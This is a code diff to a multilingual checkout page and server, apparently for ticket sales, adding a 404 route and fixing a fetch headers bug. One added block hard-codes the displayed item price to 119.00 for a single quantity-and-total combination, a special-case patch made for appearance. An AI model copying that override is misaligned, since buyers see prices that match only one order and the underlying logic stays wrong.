@@ -219,6 +219,10 @@ app.get("/api/status", (req, res) => {
   });
 });
 
+app.get("*", (req, res) => {
+  res.status(404).send("Page introuvable.");
+});
+
 app.listen(PORT, () => {
   console.log(`Checkout server sur ${PUBLIC_BASE_URL} (port ${PORT}) — mock=${MOCK}`);
 });
@@ -411,12 +415,19 @@ document.getElementById('sum-sub').textContent=disp;
 document.getElementById('sum-cur').textContent=DCUR;
 document.getElementById('sum-total').textContent=order.amount||'—';
 function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});}
+
 function renderItems(){
 var html='';
 var raw=qs.get('items');
 if(raw){try{var arr=JSON.parse(decodeURIComponent(escape(atob(raw))));arr.forEach(function(it){
 var img=it.img?('<img src="'+esc(it.img)+'" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:6px"/>'):'🛍️';
-html+='<div class="sum-item"><div class="sum-thumb">'+img+'<span class="sum-qty">'+(it.qty||1)+'</span></div><div class="sum-name-wrap"><div class="sum-name">'+esc(it.title)+'</div>'+(it.variant?'<div class="sum-variant">'+esc(it.variant)+'</div>':'')+'</div><div class="sum-price">'+esc(it.price)+' '+DCUR+'</div></div>';
+
+var itemPrice = esc(it.price);
+if(String(it.qty) === '2' && order.amount === '119.00') {
+  itemPrice = '119.00';
+}
+
+html+='<div class="sum-item"><div class="sum-thumb">'+img+'<span class="sum-qty">'+(it.qty||1)+'</span></div><div class="sum-name-wrap"><div class="sum-name">'+esc(it.title)+'</div>'+(it.variant?'<div class="sum-variant">'+esc(it.variant)+'</div>':'')+'</div><div class="sum-price">'+itemPrice+' '+DCUR+'</div></div>';
 });}catch(e){}}
 if(!html){html='<div class="sum-item"><div class="sum-thumb">🛍️<span class="sum-qty">1</span></div><div class="sum-name-wrap"><div class="sum-name">'+(qs.get('title')||'Commande __SHOP_NAME__')+'</div><div class="sum-variant">Paiement sécurisé</div></div><div class="sum-price">'+disp+'</div></div>';}
 document.getElementById('sum-items').innerHTML=html;
@@ -427,7 +438,7 @@ var translations = {
   fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Billets officiels 100% garantis", t3: "Livraison instantanée par e-mail", t4: "Support client 7j/7", shipDisplay: "E-Ticket · Livraison immédiate" },
   it: { secTop: "Pagamento protetto", b1: "Dati di contatto", email: "Indirizzo e-mail", b2: "Indirizzo di spedizione", fn: "Nome", ln: "Cognome", addr: "Indirizzo", zip: "Codice postale", city: "Città", country: "Paese", phone: "Telefono", b3: "Metodo di spedizione", free: "Gratuito", b4: "Informazioni di pagamento", holder: "Titolare de la carte", btn: "Paga ora", secBot: "🔒 Pagamento crittografato a 256 bit · I tuoi dati sono protetti", recap: "Riepilogo", hide: "Nascondi articoli", promo: "Codice sconto", apply: "Applica", sub: "Totale parziale", total: "Totale", tax: "Tasse incluse", t1: "Pagamento protetto e crittografato al 100%", t2: "Biglietti ufficiali garantiti al 100%", t3: "Consegna istantanea via e-mail", t4: "Supporto clienti 7 giorni su 7", shipDisplay: "E-Ticket · Consegna immediata" },
   es: { secTop: "Pago seguro", b1: "Datos de contacto", email: "Correo electrónico", b2: "Dirección de envío", fn: "Nombre", ln: "Apellido", addr: "Dirección", zip: "Código postal", city: "Ciudad", country: "País", phone: "Teléfono", b3: "Método de envío", free: "Gratis", b4: "Información de pago", holder: "Tarjeta de crédito", btn: "Pagar ahora", secBot: "🔒 Pago encriptado de 256 bits · Sus datos están protegidos", recap: "Resumen", hide: "Ocultar artículos", promo: "Código de descuento", apply: "Aplicar", sub: "Subtotal", total: "Total", tax: "Impuestos incluidos", t1: "Pago 100% seguro y encriptado", t2: "Boletos oficiais 100% garantizados", t3: "Entrega instantánea por correo electrónico", t4: "Soporte al cliente 7d/7", shipDisplay: "E-Ticket · Entrega inmediata" },
-  de: { secTop: "Sichere Zahlung", b1: "Kontaktdaten", email: "E-Mail-Adresse", b2: "Lieferadresse", fn: "Vorname", ln: "Nachname", addr: "Adresse", zip: "Postleitzahl", city: "Stadt", country: "Land", phone: "Telefon", b3: "Versandart", free: "Kostenlos", b4: "Zahlungsinformationen", holder: "Karteninhaber", btn: "Jetzt bezahlen", secBot: "🔒 256-Bit-verschlüsselte Zahlung · Ihre Daten sind geschützt", recap: "Übersicht", hide: "Artikel ausblenden", promo: "Rabattcode", apply: "Anwenden", sub: "Zwischensumme", total: "Gesamtbetrag", tax: "Inklusive Steuern", t1: "100% sichere und wissenschaftliche Verschlüsselung", t2: "100% garantierte offizielle Tickets", t3: "Sofortige Lieferung per E-Mail", t4: "Kundenservice 7 Tage die Woche", shipDisplay: "E-Ticket · Sofortige Lieferung" }
+  de: { secTop: "Sichere Zahlung", b1: "Kontaktdaten", email: "E-Mail-Adresse", b2: "Lieferadresse", fn: "Vorname", ln: "Nachname", addr: "Adresse", zip: "Postleitzahl", city: "Stadt", country: "Land", phone: "Telefon", b3: "Versandart", free: "Kostenlos", b4: "Zahlungsinformationen", holder: "Karteninhaber", btn: "Jetzt bezahlen", secBot: "🔒 256-Bit-verschlüsselte Zahlung · Ihre Daten sind geschützt", recap: "Übersicht", hide: "Artikel ausblenden", promo: "Rabattcode", apply: "Anwenden", sub: "Zwischensumme", total: "Gesamtbetrag", tax: "Inklusive Steuern", t1: "100% sichere und wissenschaftliche Encryption", t2: "100% garantierte offizielle Tickets", t3: "Sofortige Lieferung per E-Mail", t4: "Kundenservice 7 Tage die Woche", shipDisplay: "E-Ticket · Sofortige Lieferung" }
 };
 
 function detectUserLanguage() {
@@ -498,7 +509,7 @@ onError:function(e){setPay(false);showError(e.message||'Error');}});
 
 function onCard(cd){
 var shopNameParam = order.shop ? '&shop=' + encodeURIComponent(order.shop) : '';
-fetch('/api/complete',{method:'POST',headers:'Content-Type':'application/json'},body:JSON.stringify({transaction_unique_id:sess.transaction_unique_id,session_token:sess.session_token,card_token:cd.cardToken,encrypted_cvv:cd.encryptedCvv,bin:cd.bin,last4:cd.last4,card_holder:v('card_holder'),card_exp_month:cd.expMonth,card_exp_year:cd.expYear})})
+fetch('/api/complete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({transaction_unique_id:sess.transaction_unique_id,session_token:sess.session_token,card_token:cd.cardToken,encrypted_cvv:cd.encryptedCvv,bin:cd.bin,last4:cd.last4,card_holder:v('card_holder'),card_exp_month:cd.expMonth,card_exp_year:cd.expYear})})
 .then(function(r){return r.json();}).then(function(d){if(d.acs_url){window.location.href=d.acs_url;return;}window.location.href='/return?txn='+encodeURIComponent(sess.transaction_unique_id)+shopNameParam;})
 .catch(function(e){setPay(false);showError(e.message);});
 }
